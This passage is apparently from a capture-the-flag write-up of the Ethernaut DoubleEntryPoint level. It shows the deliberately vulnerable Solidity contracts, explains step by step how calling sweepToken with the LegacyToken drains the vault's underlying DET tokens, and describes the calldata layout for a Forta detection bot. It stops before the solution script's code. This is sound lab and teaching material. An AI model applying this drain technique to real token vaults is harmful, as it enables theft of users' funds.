<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> recipient</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        sweptTokensRecipient </span><span class="token" style="color:#d4d4d4">=</span><span> recipient</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setUnderlying</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> latestToken</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>underlying</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Already set&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        underlying </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>latestToken</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">    ...
</span><span class="token" style="color:#6a9955">    */</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sweepToken</span><span class="token" style="color:#d4d4d4">(</span><span>IERC20 token</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>token </span><span class="token" style="color:#d4d4d4">!=</span><span> underlying</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Can&#x27;t transfer underlying token&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        token</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>sweptTokensRecipient</span><span class="token" style="color:#d4d4d4">,</span><span> token</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">LegacyToken</span><span> </span><span class="token" style="color:#569CD6">is</span><span> </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;LegacyToken&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;LGT&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> Ownable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    DelegateERC20 </span><span class="token" style="color:#569CD6">public</span><span> delegate</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">//delegate is doublEntry  point  contract itself.</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">delegateToNewContract</span><span class="token" style="color:#d4d4d4">(</span><span>DelegateERC20 newContract</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        delegate </span><span class="token" style="color:#d4d4d4">=</span><span> newContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> value
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> override </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>delegate</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> super</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> delegate</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegateTransfer</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">DoubleEntryPoint</span><span> </span><span class="token" style="color:#569CD6">is</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;DoubleEntryPointToken&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;DET&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>    DelegateERC20</span><span class="token" style="color:#d4d4d4">,</span><span>
</span>    Ownable
<span></span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> cryptoVault</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> player</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> delegatedFrom</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    Forta </span><span class="token" style="color:#569CD6">public</span><span> forta</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> legacyToken</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> vaultAddress</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> fortaAddress</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> playerAddress
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        delegatedFrom </span><span class="token" style="color:#d4d4d4">=</span><span> legacyToken</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        forta </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Forta</span><span class="token" style="color:#d4d4d4">(</span><span>fortaAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        player </span><span class="token" style="color:#d4d4d4">=</span><span> playerAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        cryptoVault </span><span class="token" style="color:#d4d4d4">=</span><span> vaultAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">100</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">onlyDelegateFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> delegatedFrom</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not legacy contract&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">fortaNotify</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> detectionBot </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">usersDetectionBots</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Cache old number of bot alerts</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> previousValue </span><span class="token" style="color:#d4d4d4">=</span><span> forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">botRaisedAlerts</span><span class="token" style="color:#d4d4d4">(</span><span>detectionBot</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Notify Forta</span><span>
</span><span>        forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Continue execution</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Check if alarms have been raised</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">botRaisedAlerts</span><span class="token" style="color:#d4d4d4">(</span><span>detectionBot</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;</span><span> previousValue</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">revert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Alert has been triggered, reverting&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">delegateTransfer</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> origSender
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> override onlyDelegateFrom fortaNotify </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_transfer</span><span class="token" style="color:#d4d4d4">(</span><span>origSender</span><span class="token" style="color:#d4d4d4">,</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>There are four contracts in total <code>CryptoVault</code>, <code>DoubleEntryPoint</code>, <code>LegacyToken</code> and <code>Forta</code>.</li>
<li>CryptoVault implemented <code>sweepToken()</code> function which allows us to sweep all the tokens from the CryptoVault except the <code>underlying</code> tokens.</li>
<li>The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.</li>
<li>LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.</li>
<li><code>LegacyToken</code> also has function <code>transfer()</code> which is where the bug is,</li>
</ol>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> value
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> override </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>delegate</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> super</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> delegate</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegateTransfer</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<ol start="6">
<li>When I checked, the <code>delegate</code> is actually the address of the <code>DoubleEntryPoint</code> and it is assigned to delegate in LegacyToken contract.</li>
</ol>
<p><img src="/images/ethernaut-delegate-address.png" alt="Delegate Address Screenshot"/></p>
<pre><code> foundry command: $ cast 4 0xc89e4361
 Output:          delegate()
</code></pre>
<ol start="7">
<li>Here the <code>delegate</code> == <code>DET</code> address. Which means the LegacyToken contract is calling the <code>delegateTransfer()</code> function of <code>DoubleEntryPoint</code> contract. See the <code>delegateTransfer()</code> function below and observe what it is doing.</li>
</ol>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">delegateTransfer</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> origSender
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> override onlyDelegateFrom fortaNotify </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_transfer</span><span class="token" style="color:#d4d4d4">(</span><span>origSender</span><span class="token" style="color:#d4d4d4">,</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<ol start="8">
<li>
<p>Its sending the <code>DET</code> tokens to the <code>to</code> address from the <code>origSender</code> of <code>value</code>.</p>
</li>
<li>
<p>When this function executes it transfers DET tokens of <code>origSender</code> to the <code>to</code> address. <code>CryptoVault</code> holds 100 DET tokens.</p>
</li>
<li>
<p>So, if the <code>origSender</code> is CryptoVault and the call to <code>delegateTransfer()</code> was made by <code>LegacyToken</code> and no alerts from the <code>fortaNotify</code> will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)</p>
</li>
<li>
<p>The <code>delegateTransfer()</code> is called by LegacyToken contract from the <code>transfer()</code> function. The <code>origSender</code> is the <code>msg.sender</code> of transfer() function in LegacyToken.</p>
</li>
<li>
<p>So, we have to make the CryptoVault to call the <code>transfer()</code> function of the LegacyToken.</p>
</li>
<li>
<p>We see the one <code>transfer()</code> call is made on the <code>token</code> by CryptoVault inside <code>sweepToken()</code> function.</p>
</li>
</ol>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sweepToken</span><span class="token" style="color:#d4d4d4">(</span><span>IERC20 token</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>token </span><span class="token" style="color:#d4d4d4">!=</span><span> underlying</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Can&#x27;t transfer underlying token&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        token</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>sweptTokensRecipient</span><span class="token" style="color:#d4d4d4">,</span><span> token</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<ol start="14">
<li>
<p>To make the LegacyToken <code>tranfer()</code> called by the CryptoVault, we need to pass the LegacyToken instance to the <code>sweepToken()</code> function.</p>
</li>
<li>
<p>Now the <code>CryptoVault</code> balance of DET token becomes zero.</p>
</li>
<li>
<p>We identified the bug and sweeped out the DET tokens of the CryptoVault.</p>
</li>
<li>
<p>Now we have to write a <code>detectionbot</code> to catch this bug. We are given with <code>Forta</code> interface which can be used to build the bot.</p>
</li>
<li>
<p>We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.</p>
</li>
<li>
<p>The <code>msg.data</code> that received at <code>fortNotify()</code></p>
</li>
</ol>
<pre><code>data = &lt;delegateTransfer() signature&gt; &lt;to&gt; &lt;value&gt; &lt;origSender&gt;
</code></pre>
<ol start="20">
<li>If we access <code>msg.data</code> inside <code>handleTransaction()</code>,</li>
</ol>
<pre><code>msg.data = &lt;handleTransaction() signature&gt; &lt;user&gt; &lt;data&gt;
</code></pre>
<ol start="21">
<li>
<p>We need to extract <code>origSender</code> from the <code>msg.data</code> inside <code>handleTransaction()</code> function implemented in our bot contract.</p>
</li>
<li>
<p>Lets see how the calldata at <code>handleTransaction()</code> is looks like,</p>
</li>
</ol>
<pre><code>0x00 : handleTransaction signature[4 bytes]
0x04 : 0000....0000 // &lt;user&gt; address
0x24 : 0000....0000 // offset of the &lt;data&gt;
0x44 : 0000....0000 // length of the &lt;data&gt;
---------start of the data---------
0x64 : &lt;delegateTransfer() signature&gt; [4 bytes]
0x68 : 0000....0000 // &lt;to&gt; address
0x88 : 0000....0000 // &lt;value&gt;
0xA8 : 0000....0000 // &lt;origSender&gt;
</code></pre>
<ol start="23">
<li>
<p>So, the <code>origSender</code> is from the <code>0xA8</code> byte of the <code>msg.data</code> inside <code>handleTransaction()</code> function.</p>
</li>
<li>
<p>We can use <code>calldataload</code> opcode to access the <code>origSender</code>. And if the origSender is equals to CryptoVault then raise an alert.</p>
</li>
<li>
<p>Now the bot is ready, we have to deploy it and register the bot at <code>Forta</code> contract.</p>
</li>
</ol>
<p><strong>Level26Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">//SPDX-License-Identifier :MIT</span><span>
